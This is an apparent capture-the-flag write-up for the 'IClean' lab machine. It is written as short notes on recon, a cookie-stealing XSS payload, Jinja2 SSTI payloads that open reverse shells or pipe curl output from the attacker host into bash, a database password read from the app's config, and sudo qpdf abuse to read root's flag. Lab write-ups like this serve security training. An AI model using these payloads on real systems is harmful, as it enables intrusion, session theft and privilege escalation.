## IClean Linux Machine

[+] : 10.10.11.12

## Recon
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

[1] + Port 80 : http://capiclean.htb/

[+] + Gobuster :

		/login                (Status: 200) [Size: 2106]
		/about                (Status: 200) [Size: 5267]
		/services             (Status: 200) [Size: 8592]
		/team                 (Status: 200) [Size: 8109]
		/quote                (Status: 200) [Size: 2237]
		/logout               (Status: 302) [Size: 189] [--> /]
		/dashboard            (Status: 302) [Size: 189] [--> /]
		/choose               (Status: 200) [Size: 6084]

[+] + Either we brute force login with team names or we xss maybe on /choose 

```
service=<img+src%3dx+onerror%3dfetch("http%3a//10.10.14.39%3a1234/"%2bdocument.cookie)>&email=wahb%40gmail.com
```

```listener
10.10.11.12:57692 [404]: GET /session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.ZjA3hA.7YkBkPIYpjTx7LxcLm8gfJniHmk - No such file or directory
```

## Foothold
[1] - After accessing the dashboard & enumerating all services , a parameter in qr code making seems to be vulnerable to some code execution after decoding the base64 401 erros from LFI tests 
Generate Invoice -> paste invoice id into GenerateQr to access the vulnerable parameter Which is qr-link
[+] + {{7*7}} shows 49 in website SSTI 

## Reverse shell
[+] + Since the webserver is running flask I assumed to use python script for reverse shell but it shows 500 internal server error

[+] + This is not working Neither
{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.39 4444 >/tmp/f~')\")()}}  

[+] +  https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/
{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("curl 10.10.14.39:4444/revshell | bash")|attr("read")()}} --> WORKS

[+] +  {{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f”)("\x5f\x5fimport\x5f\x5f”)("os")|attr("popen")("bash -c '/bin/bash -i >& /dev/tcp/ATTACK_IP/1234 0>&1'")|attr("read”)()}} --> works without getting file

## Consuela user

		www-data@iclean:/$ cat /var/mail/consuela
		To: <consuela@capiclean.htb>
		Subject: Issues with PDFs
		From: management <management@capiclean.htb>
		Date: Wed September 6 09:15:33 2023



		Hey Consuela,

		Have a look over the invoices, I've been receiving some weird PDFs lately.

		Regards,
		Management

				

[+] +  cat app.py

		secret_key = ''.join(random.choice(string.ascii_lowercase) for i in range(64))
		app.secret_key = secret_key
		# Database Configuration
		db_config = {
		    'host': '127.0.0.1',
		    'user': 'iclean',
		    'password': 'pxCsmnGLckUb',
		    'database': 'capiclean'


[+] +  mysql -u iclean -p -h 127.0.0.1

		show databases;
		use consueala;
		select * from users; 
		crack consuela hash -> simple and clean 

## Privele Escalation 
[+] +  sudo -l -> qpdf

[+] +  consuela@iclean:/tmp$ sudo qpdf --empty ./root3.txt --qdf --add-attachment /root/root.txt --








